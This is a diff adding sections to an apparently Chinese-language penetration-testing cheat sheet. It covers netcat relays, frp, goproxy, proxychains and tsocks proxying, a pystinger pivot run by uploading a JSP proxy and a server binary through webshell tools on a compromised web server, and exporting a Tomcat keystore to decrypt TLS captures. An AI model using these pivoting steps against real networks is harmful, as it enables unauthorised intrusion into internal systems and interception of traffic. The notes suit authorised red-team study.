@@ -32,3 +32,79 @@ nc -l -p 8888 -c "nc 192.168.19.153 22"
 ```bash
 while :; do (nc -l -p 8888 -c "nc 192.168.19.153 22"); done
 ```
+
+# proxy
+## proxychains
+
+只对tcp流量有效，所以udp和icmp都是不能代理转发的。
+
+## frp
+
+frpc
+```shell
+frpc tcp -s 192.168.50.161:7000 -l 1234 -r 8080
+# 相当于
+[common]
+server_addr = 127.0.0.1
+server_port = 7000
+
+[tcp1]
+type = tcp
+local_ip = 127.0.0.1
+local_port = 1234
+remote_port = 8000 # 本地1234启动http-server 远程访问 192.168.50.161:8080
+```
+## goproxy
+
+```shell
+proxy.exe http -t tcp -p "0.0.0.0:8080" --daemon
+```
+## pystinger 仅web服务权限不出网使用
+[Link](https://cloud.tencent.com/developer/article/2036092) 
+
+假设不出网服务器域名为 http://example.com:8080 ,服务器内网IP地址为192.168.3.11
+
+SOCK4代理
+```
+1. proxy.jsp上传到目标服务器,确保 http://example.com:8080/proxy.jsp 可以访问,页面返回 UTF-8
+2. 将stinger_server.exe上传到目标服务器,蚁剑/冰蝎执行start D:/XXX/stinger_server.exe启动服务端
+       不要直接运行D:/XXX/stinger_server.exe,会导致tcp断连
+3. vps执行./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
+此时已经在vps127.0.0.1:60000启动了一个example.com所在内网的socks4a代理
+此时已经将目标服务器的127.0.0.1:60020映射到vps的127.0.0.1:60020
+
+...
+
+```
+
+## tocks
+apt-get install tsocks  
+vi /etc/tsocks.conf  
+
+```shell
+local = 192.168.1.0/255.255.255.0  #local表示本地的网络，也就是不使用socks代理的网络  
+local = 127.0.0.0/255.0.0.0  
+server = 127.0.0.1   #socks服务器的IP  
+server_type = 5  #socks服务版本  
+server_port = 8888  # socks服务使用的端口  
+```
+
+run
+```shell
+tsocks curl http://myexternalip.com &
+```
+
+# other
+
+## keystore,keytool,ssl证书解密pcap
+
+```shell
+keytool -list -keystore c:\keystore # 输入密钥库口令tomcat
+# 从密钥库导出.p12证书，将keystore拷贝到keytool目录，导出名为：tomcatkeystore.p12的证书，命令：
+keytool -importkeystore -srckeystore c:\keystore -destkeystore c:\tomcatkeystore.p12 -deststoretype PKCS12 -srcalias tomcat
+
+# 将.p12证书导入Wireshark
+# 在Wireshark中打开 .pcap, 菜单: 编辑–首选项–Protocols–SSL，点击右边的Edit：输入：192.168.110.140 8443 http 点击选择证书文件 输入密码tomcat
+```
+
+
